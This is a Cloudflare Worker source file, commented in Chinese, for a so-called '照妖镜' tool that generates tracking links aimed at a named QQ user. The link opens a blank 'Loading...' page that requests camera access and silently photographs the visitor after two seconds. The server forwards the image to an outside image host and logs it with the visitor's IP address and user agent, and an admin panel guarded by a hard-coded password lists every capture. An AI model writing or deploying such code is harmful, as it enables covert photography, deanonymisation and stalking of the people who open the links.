/**
 * 现代简约照妖镜 - 技术研究版
 * 功能：自动建表、极简UI、图床转发、管理员后台
 */

const ADMIN_PASSWORD = "sakcnzz666";
const IMAGE_HOST = "tc.ilqx.dpdns.org";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 1. 自动初始化数据库 (如果表不存在则创建)
    await initDB(env);

    // 2. 路由分发
    if (path === "/" || path === "/index.html") {
      return renderHome();
    }
    
    if (path.startsWith("/t/")) {
      const id = path.split("/")[2];
      return renderCapturePage(id);
    }

    if (path === "/api/upload") {
      return handleUpload(request, env);
    }

    if (path === "/api/query") {
      return handleQuery(request, env);
    }

    if (path === "/admin") {
      return renderAdmin(request, env);
    }

    return new Response("Not Found", { status: 404 });
  }
};

/**
 * 数据库初始化
 */
async function initDB(env) {
  await env.DB.prepare(`
    CREATE TABLE IF NOT EXISTS records (
      id TEXT PRIMARY KEY,
      uid TEXT,
      img_url TEXT,
      ua TEXT,
      ip TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `).run();
}

/**
 * 首页：生成面板 & 查询面板
 */
function renderHome() {
  const html = `
  <!DOCTYPE html>
  <html lang="zh-CN">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>照妖镜</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      body { background-color: #f3f4f6; }
      .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
    </style>
  </head>
  <body class="min-h-screen flex items-center justify-center p-6">
    <div class="max-w-md w-full space-y-8">
      <div class="glass p-8 rounded-3xl shadow-xl border border-gray-100">
        <h2 class="text-2xl font-bold text-gray-800 mb-6">生成面板</h2>
        <div class="space-y-4">
          <input id="target_id" type="text" placeholder="输入对方QQ或ID" class="w-full px-4 py-3 rounded-xl border border-gray-200 outline-none focus:ring-2 focus:ring-blue-500 transition-all">
          <button onclick="makeLink()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 rounded-xl shadow-lg transition-all active:scale-95">生成链接</button>
        </div>
        <div id="link_area" class="mt-4 hidden p-3 bg-blue-50 rounded-lg break-all text-sm text-blue-700 border border-blue-100"></div>
      </div>

      <div class="glass p-8 rounded-3xl shadow-xl border border-gray-100">
        <h2 class="text-2xl font-bold text-gray-800 mb-6">查询面板</h2>
        <div class="space-y-4">
          <input id="query_id" type="text" placeholder="输入识别ID" class="w-full px-4 py-3 rounded-xl border border-gray-200 outline-none focus:ring-2 focus:ring-emerald-500 transition-all">
          <button onclick="query()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-medium py-3 rounded-xl shadow-lg transition-all active:scale-95">查看照片</button>
        </div>
        <div id="img_res" class="mt-6 hidden">
          <img id="res_pic" class="w-full rounded-2xl shadow-md border border-gray-200" src="">
        </div>
      </div>
    </div>

    <script>
      function makeLink() {
        const id = document.getElementById('target_id').value;
        if(!id) return alert('请先输入ID');
        const encoded = btoa(encodeURIComponent(id));
        const url = window.location.origin + '/t/' + encoded;
        const area = document.getElementById('link_area');
        area.innerText = url;
        area.classList.remove('hidden');
      }

      async function query() {
        const id = document.getElementById('query_id').value;
        const res = await fetch('/api/query?uid=' + encodeURIComponent(id));
        const data = await res.json();
        if(data.src) {
          document.getElementById('res_pic').src = data.src;
          document.getElementById('img_res').classList.remove('hidden');
        } else {
          alert('暂无该ID的记录');
        }
      }
    </script>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

/**
 * 捕获页：空白页面 + 自动拍照
 */
function renderCapturePage(encodedId) {
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body { background: #fff; margin:0; }</style>
  </head>
  <body>
    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
      const uid = decodeURIComponent(atob("${encodedId}"));
      async function start() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
          const v = document.getElementById('v');
          v.srcObject = stream;
          v.onloadedmetadata = () => {
            setTimeout(() => {
              const c = document.getElementById('c');
              c.width = v.videoWidth;
              c.height = v.videoHeight;
              c.getContext('2d').drawImage(v, 0, 0);
              c.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('file', blob, 'photo.jpg');
                fd.append('uid', uid);
                await fetch('/api/upload', { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
              }, 'image/jpeg', 0.6);
            }, 2000);
          };
        } catch (e) {}
      }
      window.onload = start;
    </script>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

/**
 * 上传处理：转发到外部图床并保存到D1
 */
async function handleUpload(request, env) {
  try {
    const formData = await request.formData();
    const file = formData.get('file');
    const uid = formData.get('uid');
    const ua = request.headers.get('user-agent') || 'Unknown';
    const ip = request.headers.get('cf-connecting-ip') || 'Unknown';

    // 1. 转发到你的图床
    const uploadForm = new FormData();
    uploadForm.append('file', file);

    const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, {
      method: 'POST',
      body: uploadForm
    });

    const tcData = await tcRes.json();
    // 适配你的图床返回格式：[{"src":"/file/..."}]
    const imgPath = tcData[0].src;
    const fullImgUrl = `https://${IMAGE_HOST}${imgPath}`;

    // 2. 保存记录到 D1
    const recordId = crypto.randomUUID();
    await env.DB.prepare("INSERT INTO records (id, uid, img_url, ua, ip) VALUES (?, ?, ?, ?, ?)")
      .bind(recordId, uid, fullImgUrl, ua, ip)
      .run();

    return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), { status: 500 });
  }
}

/**
 * API：查询最新单条记录
 */
async function handleQuery(request, env) {
  const { searchParams } = new URL(request.url);
  const uid = searchParams.get('uid');
  const result = await env.DB.prepare("SELECT img_url FROM records WHERE uid = ? ORDER BY created_at DESC LIMIT 1")
    .bind(uid)
    .first();

  return new Response(JSON.stringify({ src: result ? result.img_url : null }), {
    headers: { "Content-Type": "application/json" }
  });
}

/**
 * 管理后台：查看所有记录
 */
async function renderAdmin(request, env) {
  const { searchParams } = new URL(request.url);
  if (searchParams.get('p') !== ADMIN_PASSWORD) {
    return new Response("Unauthorized", { status: 401 });
  }

  const { results } = await env.DB.prepare("SELECT * FROM records ORDER BY created_at DESC").all();

  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <title>后台管理</title>
    <script src="https://cdn.tailwindcss.com"></script>
  </head>
  <body class="bg-gray-50 p-8">
    <div class="max-w-6xl mx-auto">
      <h1 class="text-3xl font-bold text-gray-800 mb-8">所有捕获记录</h1>
      <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
        <table class="w-full text-left border-collapse">
          <thead class="bg-gray-50 text-gray-600 font-medium">
            <tr>
              <th class="p-4 border-b">识别ID</th>
              <th class="p-4 border-b">图片</th>
              <th class="p-4 border-b">IP / UA</th>
              <th class="p-4 border-b">时间</th>
            </tr>
          </thead>
          <tbody>
            ${results.map(r => `
              <tr class="hover:bg-gray-50 transition-colors">
                <td class="p-4 border-b font-mono text-blue-600">${r.uid}</td>
                <td class="p-4 border-b">
                  <a href="${r.img_url}" target="_blank">
                    <img src="${r.img_url}" class="h-24 w-auto rounded shadow-sm hover:scale-105 transition-transform">
                  </a>
                </td>
                <td class="p-4 border-b text-xs text-gray-400">
                  <div class="text-gray-700 font-medium mb-1">${r.ip}</div>
                  <div class="truncate max-w-xs">${r.ua}</div>
                </td>
                <td class="p-4 border-b text-sm text-gray-500">${r.created_at}</td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
    </div>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}